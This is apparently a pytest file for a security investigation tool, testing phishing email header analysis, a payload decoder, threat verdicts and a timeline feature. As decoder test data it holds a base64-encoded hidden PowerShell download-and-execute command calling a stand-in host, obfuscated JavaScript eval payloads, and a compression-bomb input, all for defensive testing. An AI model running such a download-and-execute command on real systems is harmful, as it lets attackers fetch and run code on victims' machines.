"""Investigation tools: header analysis, payload decoding, verdicts."""
import base64
import gzip

from app.api.tools import _verdict
from app.tools.decoder import decode
from app.tools.headers import analyse

PHISH = """Received: from mail.attacker-host.example (unknown [185.220.101.4])
\tby mx.victim.co.ke (Postfix) with ESMTP id 1234; Mon, 26 Oct 2026 10:00:05 +0300
Received: from [10.0.0.5] (helo=localhost) by mail.attacker-host.example with SMTP; Mon, 26 Oct 2026 09:59:58 +0300
Authentication-Results: mx.victim.co.ke; spf=softfail smtp.mailfrom=attacker-host.example; dkim=none; dmarc=fail header.from=kcb.co.ke
Return-Path: <bounce@attacker-host.example>
From: "KCB Security security@kcb.co.ke" <alerts@kcb-secure-login.example>
Reply-To: help@gmail.com
To: victim@victim.co.ke
Subject: Verify your account
Message-ID: <abc@attacker-host.example>
Date: Mon, 26 Oct 2026 09:59:50 +0300

Body text is ignored.
"""


def test_header_analysis_finds_origin_auth_and_spoofing():
    r = analyse(PHISH)
    assert r["ok"] and r["origin"]["ip"] == "185.220.101.4"  # the private 10.0.0.5 hop is skipped
    assert r["auth"]["dmarc"] == {"result": "fail", "domain": "kcb.co.ke"} and r["auth"]["spf"]["result"] == "softfail"
    titles = {w["title"] for w in r["warnings"]}
    assert {"Replies go to another domain", "Display name shows a different address", "DMARC fail"} <= titles
    assert [h["by"] for h in r["hops"]] == ["mail.attacker-host.example", "mx.victim.co.ke"]
    assert r["hops"][1]["delay_seconds"] == 7
    assert "Body text" not in str(r)


def test_header_analysis_rejects_non_headers():
    assert not analyse("hello there")["ok"]


def test_clean_mail_raises_no_alarm():
    r = analyse("From: Alice <alice@example.com>\nReturn-Path: <alice@example.com>\n"
                "Authentication-Results: mx.example.net; spf=pass smtp.mailfrom=example.com; dkim=pass header.d=example.com; dmarc=pass header.from=example.com\n"
                "DKIM-Signature: v=1; a=rsa-sha256; d=example.com; s=s1; b=abc\nMessage-ID: <1@example.com>\nSubject: hi\n")
    assert r["ok"] and r["warnings"] == []


def test_decoder_peels_powershell_and_finds_behaviour():
    inner = "IEX (New-Object Net.WebClient).DownloadString('http://evil-update.example.net/a.ps1')"
    r = decode("powershell -nop -w hidden -enc " + base64.b64encode(inner.encode("utf-16-le")).decode())
    assert r["decoded"] and r["final"] == inner
    assert {"download", "execute", "defence_evasion"} <= {b["key"] for b in r["behaviours"]}
    assert {"type": "url", "value": "http://evil-update.example.net/a.ps1"} in r["indicators"]


def test_decoder_nested_layers_and_encodings():
    gz = base64.b64encode(gzip.compress(b"var u='https://bad.example.org/x';eval(atob('YWxlcnQoMSk='))")).decode()
    r = decode(f"$s=[System.Convert]::FromBase64String('{gz}');")
    assert "alert(1)" in r["final"] and "https://bad.example.org/x" in r["final"]
    assert decode("68747470733a2f2f6576696c2e6578616d706c652e636f6d")["final"] == "https://evil.example.com"
    assert "phish.example.com" in decode("eval(String.fromCharCode(104,116,116,112,58,47,47,112,104,105,115,104,46,101,120,97,109,112,108,101,46,99,111,109))")["final"]
    assert decode("%68%74%74%70%3A%2F%2Fx.example.com%2Fa")["final"] == "http://x.example.com/a"
    assert decode("a normal sentence, nothing encoded")["decoded"] is False


def test_decoder_survives_a_compression_bomb():
    r = decode(base64.b64encode(gzip.compress(b"A" * 50_000_000)).decode())
    assert max(layer["length"] for layer in r["layers"]) <= 2_000_000 and len(r["layers"]) == 2


def test_verdict_combination():
    ok = lambda label, v: {"label": label, "ok": True, "verdict": v}
    assert _verdict(["feodo"], False, [], 0)[0] == "malicious"
    assert _verdict([], False, [ok("VirusTotal", "malicious")], 0)[0] == "malicious"
    assert _verdict([], False, [ok("GreyNoise", "suspicious")], 0)[0] == "suspicious"
    assert _verdict([], False, [], 3)[0] == "seen"
    assert _verdict([], False, [ok("InternetDB", "clean")], 0)[0] == "clean"
    assert _verdict([], True, [ok("x", "suspicious")], 2)[0] == "benign"
    assert _verdict([], False, [], 0) == ("unknown", ["Nothing known about it yet"])


def test_timeline_links_chain_in_time_order():
    from app.api.timeline import COMMON_PLATFORMS, _chain

    when = {"a": "2026-10-03", "b": "2026-10-01", "c": "2026-10-02"}
    # Joined oldest to newest, one line per step, not every pair.
    assert _chain(["a", "b", "c", "a"], when) == [("b", "c"), ("c", "a")]
    assert _chain(["a"], when) == []
    assert "github.com" in COMMON_PLATFORMS and "cisa.gov" in COMMON_PLATFORMS
